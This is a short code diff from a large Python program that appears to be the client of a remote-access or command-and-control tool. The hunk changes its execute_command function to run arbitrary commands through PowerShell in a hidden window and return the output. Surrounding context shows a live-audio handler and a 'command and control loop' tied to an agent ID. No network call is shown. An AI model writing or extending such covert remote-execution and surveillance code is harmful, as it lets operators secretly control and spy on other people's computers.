@@ -6293,19 +6293,16 @@ def handle_live_audio(command_parts):
     except Exception as e:
         return f"Live audio processing failed: {e}"
 def execute_command(command):
-    """Executes a command and returns its output."""
+    """Execute a command and return its output - COPIED FROM WORKING simple-client.py"""
     try:
         if WINDOWS_AVAILABLE:
-            # Use CMD.exe directly to avoid WSL issues
-            # Full path to avoid WSL interception
+            # Use PowerShell on Windows (EXACT COPY from simple-client.py that works!)
             result = subprocess.run(
-                ["C:\\Windows\\System32\\cmd.exe", "/c", command],
+                ["powershell.exe", "-NoProfile", "-Command", command],
                 capture_output=True,
                 text=True,
                 timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
-                encoding='utf-8',
-                errors='replace'
+                creationflags=subprocess.CREATE_NO_WINDOW
             )
         else:
             # Use bash on Linux/Unix systems
@@ -6318,17 +6315,22 @@ def execute_command(command):
         
         output = result.stdout + result.stderr
         if not output:
-            return "[No output from command]"
+            output = "[No output from command]"
+        
         return output
+        
     except subprocess.TimeoutExpired:
-        return "Command execution timed out after 30 seconds"
+        error_msg = "Command execution timed out after 30 seconds"
+        return error_msg
     except FileNotFoundError:
         if WINDOWS_AVAILABLE:
-            return "PowerShell not found. Command execution failed."
+            error_msg = "PowerShell not found. Command execution failed."
         else:
-            return "Bash not found. Command execution failed."
+            error_msg = "Bash not found. Command execution failed."
+        return error_msg
     except Exception as e:
-        return f"Command execution failed: {e}"
+        error_msg = f"Command execution failed: {e}"
+        return error_msg
 def main_loop(agent_id):
     """The main command and control loop."""
     # Initialize high-performance systems
